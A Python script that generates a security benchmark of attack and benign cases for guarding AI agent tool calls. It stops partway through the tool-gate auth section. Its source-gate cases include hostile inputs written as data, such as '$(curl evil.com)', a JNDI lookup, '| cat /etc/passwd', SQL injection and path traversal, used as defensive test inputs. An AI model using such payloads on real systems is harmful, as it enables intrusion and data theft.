#!/usr/bin/env python3
"""Build the CSE-8000 dataset: 8 surface kinds x 1,000 cases (500 attack + 500 benign).

Generates cases in canonical-v1 format (the schema consumed by run_benchmarks.py
and compare_mitigations.py).  Case patterns are ported from the oracle generator
in devel/cse_generate_cases_1k.py, adapted for the canonical field names.

Deterministic: seed=42, no network access.

Usage:
  python benchmarks/build_cse_8000.py
  python benchmarks/build_cse_8000.py --force   # overwrite existing
"""

from __future__ import annotations

import argparse
import hashlib
import json
import math
import os
import random
import string
import subprocess
import time
from collections import Counter
from pathlib import Path
from typing import Any

# ---------------------------------------------------------------------------
# Paths
# ---------------------------------------------------------------------------

ROOT = Path(__file__).resolve().parent.parent
DATASETS_ROOT = ROOT / "benchmarks" / "datasets"
OUTPUT_ID = "cse-8000"
TARGET = 500   # per side per kind
SEED = 42

# Single shared RNG; initialized in build() from SEED.
_rng = random.Random(SEED)

SURFACE_KINDS = sorted([
    "source_gate", "validation", "tool_gate", "rate_limit",
    "tool_gate_auth", "binding_replay", "action_gate", "outbound_check",
])

# ---------------------------------------------------------------------------
# Tool vocabulary (mirrors conformance profile v2.0)
# ---------------------------------------------------------------------------

DESTRUCTIVE = [
    "gmail_send_email", "gmail_delete_email", "gmail_modify_labels",
    "calendar_create_event", "calendar_delete_event",
    "slack_send_message", "slack_delete_message",
    "file_write", "file_delete", "shell_execute",
    "delete_calendar_event", "delete_gmail_draft",
    "create_calendar_event", "reply_gmail_email", "create_gmail_draft",
]

NON_DESTRUCTIVE = [
    "search_knowledge", "list_files", "get_weather",
    "query_database", "read_document",
]

ALL_TOOLS = DESTRUCTIVE + NON_DESTRUCTIVE

UNKNOWN_TOOLS = [
    "custom_tool", "internal_process", "admin_reset", "deploy_service",
    "batch_job", "render_template", "compile_code", "run_tests",
    "parse_json", "validate_schema", "format_output", "merge_data",
    "sort_records", "filter_items", "aggregate_stats", "encrypt_payload",
    "decrypt_payload", "compress_file", "decompress_file", "hash_string",
    "send_notification", "log_event", "audit_trail",
    "generate_report", "sync_data",
]

_ENTROPY_THRESHOLD = 4.5
_ENTROPY_MIN_LENGTH = 20


def _shannon_entropy(s: str) -> float:
    """Compute Shannon entropy in bits per character."""
    if not s:
        return 0.0
    freq: dict[str, int] = {}
    for ch in s:
        freq[ch] = freq.get(ch, 0) + 1
    length = len(s)
    return -sum((c / length) * math.log2(c / length) for c in freq.values())


def _shannon_entropy_bytes(data: bytes) -> float:
    """Compute Shannon entropy in bits per byte."""
    if not data:
        return 0.0
    freq: dict[int, int] = {}
    for b in data:
        freq[b] = freq.get(b, 0) + 1
    length = len(data)
    return -sum((c / length) * math.log2(c / length) for c in freq.values())


def _make_high_entropy_token(rng: random.Random, length: int = 40) -> str:
    """Generate a token guaranteed to exceed 4.5 bits entropy."""
    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    for _ in range(100):
        tok = "".join(rng.choices(charset, k=length))
        if _shannon_entropy(tok) >= _ENTROPY_THRESHOLD:
            return tok
    # Fallback: use all unique chars to guarantee high entropy
    return (charset * ((length // len(charset)) + 1))[:length]


def _make_high_entropy_hex(rng: random.Random, n_bytes: int = 30) -> str:
    """Generate hex-encoded bytes guaranteed to exceed 4.5 bits byte-entropy."""
    for _ in range(100):
        raw = rng.randbytes(n_bytes)
        if _shannon_entropy_bytes(raw) >= _ENTROPY_THRESHOLD:
            return "".join(f"{b:02x}" for b in raw)
    # Fallback: use bytes 0..n_bytes to guarantee diversity
    return "".join(f"{(i % 256):02x}" for i in range(n_bytes))


EXAMPLE_RECIPIENTS = [
    "alice@example.com", "bob@example.com", "carol@example.com",
    "dave@example.com", "eve@example.com", "frank@example.com",
    "grace@example.com", "heidi@example.com", "ivan@example.com",
    "judy@example.com",
]

# ---------------------------------------------------------------------------
# Attack-like classification (mirrors compare_mitigations._is_attack_like_case)
# ---------------------------------------------------------------------------


def _is_attack_like(case: dict[str, Any]) -> bool:
    kind = case.get("kind")
    if kind in {"tool_gate", "tool_gate_auth", "outbound_check", "binding_replay"}:
        return not bool(case.get("expect_allowed", True))
    if kind == "action_gate":
        return not bool(case.get("expect_confirmed", True))
    if kind == "validation":
        return not bool(case.get("expect_valid", True))
    if kind == "source_gate":
        return case.get("expect_policy") != "allow"
    if kind == "rate_limit":
        return (
            not bool(case.get("expect_final_allowed", False))
            or case.get("expect_any_anomaly_contains") is not None
            or bool(case.get("expect_retry_after_positive", False))
        )
    return False


# ---------------------------------------------------------------------------
# Case accumulator
# ---------------------------------------------------------------------------

_cases: list[dict] = []
_id_counter = 0


def _make(kind: str, suite: str = "cse8k", **fields: Any) -> dict:
    global _id_counter
    _id_counter += 1
    case = {"id": f"cse8k-{_id_counter:05d}", "kind": kind, "suite": suite}
    case.update(fields)
    _cases.append(case)
    return case


def _kind_count(kind: str, side: str) -> int:
    if side == "attack":
        return sum(1 for c in _cases if c["kind"] == kind and _is_attack_like(c))
    return sum(1 for c in _cases if c["kind"] == kind and not _is_attack_like(c))


# =========================================================================
# 1. SOURCE GATE (500 benign + 500 attack)
# =========================================================================
#
# run_source_gate calls check_extraction_allowed(source_type, source_id).
# Policy is determined by source_type:
#   ALLOW: user_input, assistant_response, cli
#   QUARANTINE: mcp_client, user_indexed_web, user_indexed_email, web_synthesis
#   BLOCK: email_content, calendar_content, web_content, rag_content, tool_output
#   Unknown -> BLOCK
# =========================================================================

def _gen_source_gate() -> None:
    # --- BENIGN (expect_policy = "allow") ---
    ALLOW_SOURCES = ["user_input", "assistant_response", "cli"]
    for src in ALLOW_SOURCES:
        _make("source_gate", source_type=src, source_id=f"{src}-0", expect_policy="allow")
        _make("source_gate", source_type=src, source_id="", expect_policy="allow")
        for i in range(5):
            _make("source_gate", source_type=src, source_id=f"{src}-{i+1:03d}", expect_policy="allow")

    # Quarantine tier (expect_policy = "quarantine" but still "not attack" in
    # the _is_attack_like sense ... wait: _is_attack_like says quarantine IS attack).
    # So quarantine sources are ATTACK-like.  Only ALLOW sources are benign.

    # Fill benign with randomized allow-tier sources
    rng = _rng  # was: random.Random(1001)
    while _kind_count("source_gate", "benign") < TARGET:
        src = rng.choice(ALLOW_SOURCES)
        sid = f"{src}-{rng.randint(0, 99999):05d}"
        _make("source_gate", source_type=src, source_id=sid, expect_policy="allow")

    # --- ATTACK (expect_policy != "allow") ---
    QUARANTINE_SOURCES = ["mcp_client", "user_indexed_web", "user_indexed_email", "web_synthesis"]
    BLOCK_SOURCES = ["email_content", "calendar_content", "web_content", "rag_content", "tool_output"]

    # Quarantine tier
    for src in QUARANTINE_SOURCES:
        _make("source_gate", source_type=src, source_id=f"{src}-1", expect_policy="quarantine")
        _make("source_gate", source_type=src, source_id="", expect_policy="quarantine")
        for i in range(3):
            _make("source_gate", source_type=src, source_id=f"id-{i}", expect_policy="quarantine")

    # Block tier
    for src in BLOCK_SOURCES:
        _make("source_gate", source_type=src, source_id=f"{src}-1", expect_policy="block")
        _make("source_gate", source_type=src, source_id="", expect_policy="block")

    # Unknown source types (default BLOCK)
    UNKNOWN_BLOCKED = [
        "malware_output", "random_string", "database_dump", "file_upload",
        "clipboard", "screenshot", "microphone", "camera", "gps",
        "bluetooth", "nfc", "usb_device", "serial_port", "network_tap",
        "debug_console", "memory_dump", "kernel_log", "firmware_update",
        "biometric_data", "rfid_reader", "satellite_feed", "drone_telemetry",
        "sensor_array", "video_stream", "audio_capture", "thermal_image",
        "lidar_scan", "radar_signal", "sonar_ping", "chemical_sensor",
    ]
    for src in UNKNOWN_BLOCKED:
        _make("source_gate", source_type=src, source_id="", expect_policy="block")

    # Case sensitivity (all block as unknown)
    case_sensitive = [
        "User_Input", "USER_INPUT", "user_INPUT", "ASSISTANT_RESPONSE",
        "Assistant_Response", "Web_Content", "WEB_CONTENT", "Cli", "CLI",
        "cLi", "mcp_Client", "MCP_CLIENT", "Tool_Output", "TOOL_OUTPUT",
        "User_Indexed_Web", "EMAIL_CONTENT", "Calendar_Content",
        "RAG_CONTENT", "Web_Synthesis", "WEB_SYNTHESIS",
    ]
    for src in case_sensitive:
        _make("source_gate", source_type=src, source_id="", expect_policy="block")

    # Whitespace violations
    whitespace = [
        " user_input", "user_input ", " user_input ",
        "\tuser_input", "user_input\n", "\nweb_content",
        "  cli  ", "\t\tcli", "assistant_response\r",
        " mcp_client", "tool_output\t", "\r\nuser_input",
    ]
    for src in whitespace:
        _make("source_gate", source_type=src, source_id="", expect_policy="block")

    # Unicode confusables
    _make("source_gate", source_type="user_\u0456nput", source_id="", expect_policy="block")
    _make("source_gate", source_type="\u0430ssistant_response", source_id="", expect_policy="block")
    _make("source_gate", source_type="\uff57eb_content", source_id="", expect_policy="block")
    _make("source_gate", source_type="to\u03bfl_output", source_id="", expect_policy="block")
    _make("source_gate", source_type="w\u0435b_content", source_id="", expect_policy="block")
    _make("source_gate", source_type="cl\u0456", source_id="", expect_policy="block")
    _make("source_gate", source_type="cli\u0301", source_id="", expect_policy="block")
    _make("source_gate", source_type="\u202euser_input", source_id="", expect_policy="block")
    _make("source_gate", source_type="user\u200d_input", source_id="", expect_policy="block")
    _make("source_gate", source_type="t\u043eol_output", source_id="", expect_policy="block")

    # Injection payloads as source types
    injections = [
        "<script>alert(1)</script>", "'; DROP TABLE users; --",
        "$(curl evil.com)", "../../../etc/passwd", "{{7*7}}",
        "${jndi:ldap://evil}", "OR 1=1", "%00user_input",
        "user_input%00", "\\x00cli", "| cat /etc/passwd",
        "`whoami`", "$(id)", "' OR '1'='1",
    ]
    for src in injections:
        _make("source_gate", source_type=src, source_id="", expect_policy="block")

    # Substring/prefix near-misses
    partials = [
        "user", "user_input_extra", "user_inputt", "xuser_input",
        "web_content_extra", "cli_extra", "_cli",
        "user input", "user-input", "userinput", "tool_output2",
        "mcpclient", "mcp-client", "web synthesis",
        "assistant response", "user_indexed",
    ]
    for src in partials:
        _make("source_gate", source_type=src, source_id="", expect_policy="block")

    # Empty and very long
    _make("source_gate", source_type="", source_id="", expect_policy="block")
    _make("source_gate", source_type="x" * 10000, source_id="", expect_policy="block")

    # Fill remaining attack
    rng_a = _rng  # was: random.Random(1002)
    all_atk_sources = QUARANTINE_SOURCES + BLOCK_SOURCES
    atk_policies = {s: "quarantine" for s in QUARANTINE_SOURCES}
    atk_policies.update({s: "block" for s in BLOCK_SOURCES})
    while _kind_count("source_gate", "attack") < TARGET:
        variant = rng_a.randint(0, 3)
        if variant == 0:
            src = rng_a.choice(all_atk_sources)
            _make("source_gate", source_type=src, source_id=f"id-{rng_a.randint(0,9999)}", expect_policy=atk_policies[src])
        elif variant == 1:
            src = "unknown_" + "".join(rng_a.choices(string.ascii_lowercase, k=8))
            _make("source_gate", source_type=src, source_id="", expect_policy="block")
        elif variant == 2:
            src = rng_a.choice(BLOCK_SOURCES)
            _make("source_gate", source_type=src, source_id=f"s-{rng_a.randint(0,999)}", expect_policy="block")
        else:
            src = rng_a.choice(QUARANTINE_SOURCES)
            _make("source_gate", source_type=src, source_id=f"q-{rng_a.randint(0,999)}", expect_policy="quarantine")


# =========================================================================
# 2. VALIDATION (500 benign + 500 attack)
# =========================================================================
#
# run_validation calls guard.validate_tool_args(tool, args).
# ARGUMENT_LIMITS: message(50000), content(500000), query(1000),
#   source_name(200, pattern), thread_handle(100, pattern),
#   provenance(10 fields, 500 chars/value).
# ".." in any known string arg -> fail.  Unknown args silently ignored.
# =========================================================================

def _gen_validation() -> None:
    # --- BENIGN ---

    # message: valid
    _make("validation", tool="gmail_send_email", args={"message": "Hello, how are you?"}, expect_valid=True)
    _make("validation", tool="slack_send_message", args={"message": "x" * 50000}, expect_valid=True)
    _make("validation", tool="gmail_send_email", args={"message": ""}, expect_valid=True)

    # content: valid
    _make("validation", tool="file_write", args={"content": "file data here"}, expect_valid=True)
    _make("validation", tool="file_write", args={"content": "x" * 500000}, expect_valid=True)
    _make("validation", tool="file_write", args={"content": ""}, expect_valid=True)

    # query: valid
    _make("validation", tool="search_knowledge", args={"query": "weather today"}, expect_valid=True)
    _make("validation", tool="query_database", args={"query": "x" * 1000}, expect_valid=True)
    _make("validation", tool="search_knowledge", args={"query": ""}, expect_valid=True)

    # source_name: valid
    valid_source_names = [
        "my-docs/notes", "project files/report.v2", "a" * 200,
        "simple", "with-hyphen", "with_underscore", "with.dot",
        "with space", "path/to/file", "CamelCase", "UPPER",
        "mix-of_all. /chars", "123numeric", "a", "file.txt",
        "deep/nested/path/to/file", "My Documents/report",
        "version-2.1/data", "project_alpha/src/main",
        "test-data/set_01", "user files/backup.tar",
    ]
    for sn in valid_source_names:
        _make("validation", tool="search_knowledge", args={"source_name": sn}, expect_valid=True)

    # thread_handle: valid
    valid_handles = [
        "abc", "ABC", "a-b", "a_b", "123", "a1b2c3", "A-B_C",
        "abcdefghijklmnop", "THREAD-001", "msg_12345",
        "T", "x-y-z", "A_B_C_D", "0123456789", "aAbBcCdDeE",
        "long-thread-handle-name-12345", "MSG-2026-001",
        "session_abc123", "REPLY-THREAD-42", "sub-thread_99",
    ]
    for th in valid_handles:
        _make("validation", tool="slack_send_message", args={"thread_handle": th}, expect_valid=True)

    # provenance: valid
    _make("validation", tool="search_knowledge", args={"provenance": {"source": "web"}}, expect_valid=True)
    _make("validation", tool="search_knowledge", args={"provenance": {f"key{i}": f"val{i}" for i in range(10)}}, expect_valid=True)
    _make("validation", tool="search_knowledge", args={"provenance": {}}, expect_valid=True)
    _make("validation", tool="search_knowledge", args={"provenance": {"key": "x" * 500}}, expect_valid=True)

    # Unknown tools (open-world, pass)
    _make("validation", tool="mystery_tool", args={"anything": "goes"}, expect_valid=True)
    _make("validation", tool="custom_action", args={}, expect_valid=True)

    # Unknown arg names (silently ignored)
    _make("validation", tool="gmail_send_email", args={"message": "hi", "priority": "high"}, expect_valid=True)
    _make("validation", tool="gmail_send_email", args={"priority": "high", "cc": "bob@x.com"}, expect_valid=True)

    # Non-string values for known names (silently ignored)
    _make("validation", tool="gmail_send_email", args={"message": 42}, expect_valid=True)
    _make("validation", tool="search_knowledge", args={"query": ["not", "a", "string"]}, expect_valid=True)
    _make("validation", tool="file_write", args={"content": True}, expect_valid=True)
    _make("validation", tool="search_knowledge", args={"provenance": "not a dict"}, expect_valid=True)

    # Single dot (not ".."), triple dots
    _make("validation", tool="gmail_send_email", args={"message": "file ./here is fine"}, expect_valid=True)
    _make("validation", tool="search_knowledge", args={"query": "wait, what?"}, expect_valid=True)

    # Boundary: at limit (pass)
    for name, limit in [("message", 50000), ("query", 1000), ("source_name", 200), ("thread_handle", 100)]:
        val = "t" * limit if name == "thread_handle" else "a" * limit
        _make("validation", tool="search_knowledge", args={name: val}, expect_valid=True)

    # Bulk benign fill
    rng = _rng  # was: random.Random(2001)
    benign_tools = ALL_TOOLS + [f"unknown_tool_{i}" for i in range(10)]
    benign_args = [
        ("message", lambda r: "Hello " + "".join(r.choices(string.ascii_letters, k=r.randint(5, 30)))),
        ("query", lambda r: "search " + "".join(r.choices(string.ascii_letters, k=r.randint(3, 15)))),
        ("source_name", lambda r: "dir/" + "".join(r.choices("abcdefghij_-", k=r.randint(3, 15)))),
        ("thread_handle", lambda r: "th-" + "".join(r.choices("abcdefABCDEF0123456789_-", k=r.randint(5, 20)))),
        ("content", lambda r: "data: " + "".join(r.choices(string.ascii_letters, k=r.randint(10, 50)))),
    ]
    while _kind_count("validation", "benign") < TARGET:
        tool = rng.choice(benign_tools)
        arg_name, gen_fn = rng.choice(benign_args)
        _make("validation", tool=tool, args={arg_name: gen_fn(rng)}, expect_valid=True)

    # --- ATTACK ---

    # Oversized
    _make("validation", tool="gmail_send_email", args={"message": "x" * 50001}, expect_valid=False)
    _make("validation", tool="gmail_send_email", args={"message": "x" * 100000}, expect_valid=False)
    _make("validation", tool="file_write", args={"content": "x" * 500001}, expect_valid=False)
    _make("validation", tool="file_write", args={"content": "x" * 1000000}, expect_valid=False)
    _make("validation", tool="search_knowledge", args={"query": "x" * 1001}, expect_valid=False)
    _make("validation", tool="search_knowledge", args={"source_name": "a" * 201}, expect_valid=False)
    _make("validation", tool="slack_send_message", args={"thread_handle": "t" * 101}, expect_valid=False)

    # Boundary: at limit+1 (fail)
    for name, limit in [("message", 50000), ("query", 1000), ("source_name", 200), ("thread_handle", 100)]:
        val = "t" * (limit + 1) if name == "thread_handle" else "a" * (limit + 1)
        _make("validation", tool="search_knowledge", args={name: val}, expect_valid=False)
    _make("validation", tool="file_write", args={"content": "x" * 500001}, expect_valid=False)

    # source_name pattern mismatch
    invalid_names = [
        "name@#$%", "name`cmd`", "name;drop", "has@at", "has#hash",
        "has$dollar", "has%percent", "has^caret", "has&amp", "has*star",
        "has(paren", "has)paren", "has+plus", "has=equal", "has{brace",
        "has}brace", "has|pipe", "has\\backslash", "has!bang",
        "has~tilde", "has'quote", 'has"dquote', "has<angle", "has>angle",
        "has?question", "has:colon", "has,comma", "name;cmd",
        "path@evil.com", "src#fragment",
    ]
    for sn in invalid_names:
        _make("validation", tool="search_knowledge", args={"source_name": sn}, expect_valid=False)

    # thread_handle pattern mismatch
    invalid_handles = [
        "a b", "a.b", "a/b", "a@b", " ", "a\tb", "a\nb",
        "id!", "id#", "a,b", "a;b", "a:b", "a=b", "a+b",
        "a(b", "a)b", "a{b", "a}b", "a|b", "a'b", 'a"b',
        "a<b", "a>b", "a?b", "a~b", "a`b", "a*b",
    ]
    for th in invalid_handles:
        _make("validation", tool="slack_send_message", args={"thread_handle": th}, expect_valid=False)

    # Path traversal
    _make("validation", tool="gmail_send_email", args={"message": "look at ../secret"}, expect_valid=False)
    _make("validation", tool="file_write", args={"content": "../../etc/passwd"}, expect_valid=False)
    _make("validation", tool="search_knowledge", args={"query": "../../../sensitive"}, expect_valid=False)
    _make("validation", tool="search_knowledge", args={"source_name": "a/../outside"}, expect_valid=False)
    _make("validation", tool="gmail_send_email", args={"message": "foo/../bar/secret"}, expect_valid=False)
    _make("validation", tool="slack_send_message", args={"thread_handle": "..handle"}, expect_valid=False)

    # Provenance over limits
    _make("validation", tool="search_knowledge", args={"provenance": {f"key{i}": f"val{i}" for i in range(11)}}, expect_valid=False)
    _make("validation", tool="search_knowledge", args={"provenance": {f"f{i}": "v" for i in range(15)}}, expect_valid=False)
    _make("validation", tool="search_knowledge", args={"provenance": {"key": "x" * 501}}, expect_valid=False)

    # Multiple args where one fails
    _make("validation", tool="gmail_send_email", args={"message": "has ../traversal", "query": "valid"}, expect_valid=False)
    _make("validation", tool="search_knowledge", args={"message": "fine", "query": "x" * 1001}, expect_valid=False)

    # Bulk attack fill
    rng_a = _rng  # was: random.Random(2002)
    fail_templates = [
        ("message", lambda r: "x" * (50001 + r.randint(0, 1000))),
        ("query", lambda r: "x" * (1001 + r.randint(0, 500))),
        ("source_name", lambda r: "name@" + "".join(r.choices(string.ascii_letters, k=5))),
        ("thread_handle", lambda r: "th " + "".join(r.choices(string.ascii_letters, k=10))),
        ("content", lambda r: "x" * (500001 + r.randint(0, 1000))),
        ("message", lambda r: "path ../to/" + "".join(r.choices(string.ascii_letters, k=10))),
        ("query", lambda r: "../" + "".join(r.choices(string.ascii_letters, k=10))),
        ("source_name", lambda r: "a" * (201 + r.randint(0, 50))),
        ("thread_handle", lambda r: "t" * (101 + r.randint(0, 50))),
    ]
    while _kind_count("validation", "attack") < TARGET:
        tool = rng_a.choice(ALL_TOOLS)
        arg_name, gen_fn = rng_a.choice(fail_templates)
        _make("validation", tool=tool, args={arg_name: gen_fn(rng_a)}, expect_valid=False)


# =========================================================================
# 3. TOOL GATE (500 benign + 500 attack)
# =========================================================================
#
# run_tool_gate builds SecurityContext(mode=case.mode, policy=PolicyConfig(**case.policy))
# and calls guard.check_tool_call(tool, args, ctx).
# Pass: non-destructive or (destructive + enable_destructive=True) or in scope.
# Fail: destructive + not enabled, or not in allowlist.
# =========================================================================

def _gen_tool_gate() -> None:
    # --- BENIGN ---

    # Non-destructive tools
    for tool in NON_DESTRUCTIVE:
        _make("tool_gate", tool=tool, args={}, mode="client", policy={}, expect_allowed=True)
        _make("tool_gate", tool=tool, args={}, mode="client", policy={"enable_destructive": False}, expect_allowed=True)
        _make("tool_gate", tool=tool, args={}, mode="client", policy={"enable_destructive": True}, expect_allowed=True)

    # Unknown tools (not destructive, no scopes -- client mode passes non-destructive)
    for tool in UNKNOWN_TOOLS[:20]:
        _make("tool_gate", tool=tool, args={}, mode="client", policy={}, expect_allowed=True)

    # Tool in allowlist (server mode, non-destructive)
    for tool in NON_DESTRUCTIVE:
        _make("tool_gate", tool=tool, args={}, mode="server",
              policy={"capability_scopes": {t: {} for t in ALL_TOOLS}}, expect_allowed=True)

    # Destructive in allowlist + enabled (server mode -- no auth needed in server mode)
    for tool in DESTRUCTIVE:
        _make("tool_gate", tool=tool, args={}, mode="server",
              policy={"capability_scopes": {t: {} for t in ALL_TOOLS}, "enable_destructive": True}, expect_allowed=True)

    # Tool with just its own scope (server mode)
    _make("tool_gate", tool="list_files", args={}, mode="server",
          policy={"capability_scopes": {"list_files": {}}}, expect_allowed=True)

    # Destructive with just its own scope (server mode)
    for tool in DESTRUCTIVE[:5]:
        _make("tool_gate", tool=tool, args={}, mode="server",
              policy={"capability_scopes": {tool: {}}, "enable_destructive": True}, expect_allowed=True)

    # Bulk benign
    rng = _rng  # was: random.Random(3001)
    while _kind_count("tool_gate", "benign") < TARGET:
        variant = rng.randint(0, 3)
        if variant == 0:
            # Non-destructive in client mode (always passes)
            tool = rng.choice(NON_DESTRUCTIVE)
            _make("tool_gate", tool=tool, args={}, mode="client", policy={}, expect_allowed=True)
        elif variant == 1:
            # Destructive in server mode with scopes + enabled (passes)
            tool = rng.choice(DESTRUCTIVE)
            _make("tool_gate", tool=tool, args={}, mode="server",
                  policy={"capability_scopes": {tool: {}}, "enable_destructive": True}, expect_allowed=True)
        elif variant == 2:
            # Unknown tool in client mode (not destructive, passes)
            suffix = "".join(rng.choices(string.ascii_lowercase, k=6))
            _make("tool_gate", tool=f"custom_{suffix}", args={}, mode="client", policy={}, expect_allowed=True)
        else:
            # Non-destructive in server mode with scopes (passes)
            tool = rng.choice(NON_DESTRUCTIVE)
            pol: dict[str, Any] = {"capability_scopes": {tool: {}}}
            _make("tool_gate", tool=tool, args={}, mode="server", policy=pol, expect_allowed=True)

    # --- ATTACK ---

    # Destructive blocked by default
    for tool in DESTRUCTIVE:
        _make("tool_gate", tool=tool, args={}, mode="client", policy={}, expect_allowed=False)
        _make("tool_gate", tool=tool, args={}, mode="client",
              policy={"enable_destructive": False}, expect_allowed=False)

    # Destructive in allowlist but enable_destructive=False
    for tool in DESTRUCTIVE:
        _make("tool_gate", tool=tool, args={}, mode="server",
              policy={"capability_scopes": {tool: {}}, "enable_destructive": False}, expect_allowed=False)

    # Not in allowlist (server mode)
    for tool in NON_DESTRUCTIVE:
        _make("tool_gate", tool=tool, args={}, mode="server",
              policy={"capability_scopes": {"other_tool": {}}}, expect_allowed=False)

    # Empty allowlist blocks all
    for tool in NON_DESTRUCTIVE:
        _make("tool_gate", tool=tool, args={}, mode="server",
              policy={"capability_scopes": {}}, expect_allowed=False)

    for tool in DESTRUCTIVE[:5]:
        _make("tool_gate", tool=tool, args={}, mode="server",
              policy={"capability_scopes": {}, "enable_destructive": True}, expect_allowed=False)

    # Unknown tool not in allowlist (server mode)
    for tool in UNKNOWN_TOOLS[:10]:
        _make("tool_gate", tool=tool, args={}, mode="server",
              policy={"capability_scopes": {"search_knowledge": {}}}, expect_allowed=False)

    # Destructive not in scopes
    for tool in DESTRUCTIVE[:10]:
        others = {t: {} for t in NON_DESTRUCTIVE}
        _make("tool_gate", tool=tool, args={}, mode="server",
              policy={"capability_scopes": others, "enable_destructive": True}, expect_allowed=False)

    # Bulk attack
    rng_a = _rng  # was: random.Random(3002)
    while _kind_count("tool_gate", "attack") < TARGET:
        variant = rng_a.randint(0, 3)
        if variant == 0:
            tool = rng_a.choice(DESTRUCTIVE)
            _make("tool_gate", tool=tool, args={}, mode="client", policy={}, expect_allowed=False)
        elif variant == 1:
            tool = rng_a.choice(ALL_TOOLS)
            others = {t: {} for t in rng_a.sample(ALL_TOOLS, min(3, len(ALL_TOOLS))) if t != tool}
            if tool in others:
                del others[tool]
            _make("tool_gate", tool=tool, args={}, mode="server",
                  policy={"capability_scopes": others}, expect_allowed=False)
        elif variant == 2:
            tool = rng_a.choice(ALL_TOOLS)
            pol2: dict[str, Any] = {"capability_scopes": {}}
            if tool in DESTRUCTIVE:
                pol2["enable_destructive"] = True
            _make("tool_gate", tool=tool, args={}, mode="server", policy=pol2, expect_allowed=False)
        else:
            tool = rng_a.choice(DESTRUCTIVE)
            _make("tool_gate", tool=tool, args={}, mode="server",
                  policy={"capability_scopes": {tool: {}}, "enable_destructive": False}, expect_allowed=False)


# =========================================================================
# 4. RATE LIMIT (500 benign + 500 attack)
# =========================================================================
#
# run_rate_limit creates RateLimiter(limits=case.limits), iterates case.sequence
# (list of recipient strings), calling limiter.check/record.
# Benign for _is_attack_like: expect_final_allowed=True AND no anomaly/retry fields.
# =========================================================================

def _gen_rate_limit() -> None:
    # --- BENIGN (expect_final_allowed=True, no anomaly/retry fields) ---

    # Single call under limit
    _make("rate_limit", action="gmail_send_email",
          limits={"emails_per_hour": 10, "burst_threshold": 10, "burst_window_seconds": 60, "novel_recipient_flag": False},
          sequence=["alice@example.com"], expect_final_allowed=True)

    # Multiple calls under limit
    for n in [2, 3, 5, 8]:
        _make("rate_limit", action="gmail_send_email",
              limits={"emails_per_hour": 100, "burst_threshold": 20, "burst_window_seconds": 60, "novel_recipient_flag": False},
              sequence=[f"user{i % 3}@example.com" for i in range(n)], expect_final_allowed=True)

    # All same recipient
    for n in [1, 2, 3, 5]:
        _make("rate_limit", action="gmail_send_email",
              limits={"emails_per_hour": 100, "burst_threshold": 20, "burst_window_seconds": 60, "novel_recipient_flag": False},
              sequence=["same@example.com"] * n, expect_final_allowed=True)

    # Bulk benign
    rng = _rng  # was: random.Random(4001)
    while _kind_count("rate_limit", "benign") < TARGET:
        limit = rng.randint(10, 100)
        n_calls = rng.randint(1, min(limit, 9))
        seq = [f"user{j % 3}@example.com" for j in range(n_calls)]
        _make("rate_limit", action="gmail_send_email",
              limits={"emails_per_hour": limit, "burst_threshold": max(n_calls + 1, 10),
                      "burst_window_seconds": 60, "novel_recipient_flag": False},
              sequence=seq, expect_final_allowed=True)

    # --- ATTACK ---

    # Over hourly limit
    for limit in [2, 3, 5, 10]:
        _make("rate_limit", action="gmail_send_email",
              limits={"emails_per_hour": limit, "burst_threshold": 100, "burst_window_seconds": 60, "novel_recipient_flag": False},
              sequence=["a@example.com"] * (limit + 1),
              expect_final_allowed=False, expect_retry_after_positive=True)

    # Burst detection
    _make("rate_limit", action="gmail_send_email",
          limits={"emails_per_hour": 100, "burst_threshold": 2, "burst_window_seconds": 60, "novel_recipient_flag": False},
          sequence=["a@example.com"] * 3,
          expect_final_allowed=True, expect_any_anomaly_contains="Rapid burst")

    # Novel recipient detection
    _make("rate_limit", action="gmail_send_email",
          limits={"emails_per_hour": 100, "burst_threshold": 100, "burst_window_seconds": 60, "novel_recipient_flag": True},
          sequence=["a@example.com", "b@example.com"],
          expect_final_allowed=True, expect_any_anomaly_contains="Novel recipient")

    # Bulk attack
    rng_a = _rng  # was: random.Random(4002)
    while _kind_count("rate_limit", "attack") < TARGET:
        variant = rng_a.randint(0, 2)
        if variant == 0:
            # Over hourly limit
            limit = rng_a.randint(2, 10)
            n_calls = limit + rng_a.randint(1, 5)
            _make("rate_limit", action="gmail_send_email",
                  limits={"emails_per_hour": limit, "burst_threshold": 100,
                          "burst_window_seconds": 60, "novel_recipient_flag": False},
                  sequence=[f"user{j % 3}@example.com" for j in range(n_calls)],
                  expect_final_allowed=False, expect_retry_after_positive=True)
        elif variant == 1:
            # Burst anomaly
            _make("rate_limit", action="gmail_send_email",
                  limits={"emails_per_hour": 100, "burst_threshold": 2,
                          "burst_window_seconds": 60, "novel_recipient_flag": False},
                  sequence=["a@example.com"] * rng_a.randint(3, 6),
                  expect_final_allowed=True, expect_any_anomaly_contains="Rapid burst")
        else:
            # Novel recipient
            n = rng_a.randint(2, 5)
            _make("rate_limit", action="gmail_send_email",
                  limits={"emails_per_hour": 100, "burst_threshold": 100,
                          "burst_window_seconds": 60, "novel_recipient_flag": True},
                  sequence=[f"unique{j}@example.com" for j in range(n)],
                  expect_final_allowed=True, expect_any_anomaly_contains="Novel recipient")


# =========================================================================
# 5. TOOL GATE AUTH (500 benign + 500 attack)
# =========================================================================
#
# run_tool_gate_auth creates auth via Guard.authorize(action, scope, user_message,
# timestamp=time.time()-offset), then check_tool_call with that auth.
# timestamp_offset_sec: 0 = fresh, >3600 = expired.
# =========================================================================

def _gen_tool_gate_auth() -> None:
    # --- BENIGN ---

    # Valid auth for each tool
    for tool in ALL_TOOLS:
        pol = {"enable_destructive": True} if tool in DESTRUCTIVE else {}
        recip = EXAMPLE_RECIPIENTS[ALL_TOOLS.index(tool) % len(EXAMPLE_RECIPIENTS)]
        _make("tool_gate_auth", tool=tool, args={"to": recip}, mode="client",
              policy=pol, auth_action=tool, auth_scope={"to": recip},
              message=f"send to {recip}", expect_allowed=True)

    # Different scope values
    for i, recip in enumerate(EXAMPLE_RECIPIENTS):
        _make("tool_gate_auth", tool="gmail_send_email", args={"to": recip},
              mode="client", policy={"enable_destructive": True},
              auth_action="gmail_send_email", auth_scope={"to": recip},
              message=f"send to {recip}", expect_allowed=True)

    # Non-destructive with valid auth
    _make("tool_gate_auth", tool="search_knowledge", args={"query": "test"},
          mode="client", policy={},
          auth_action="search_knowledge", auth_scope={"query": "test"},
          message="search for test", expect_allowed=True)

    # Bulk benign
    rng = _rng  # was: random.Random(5001)
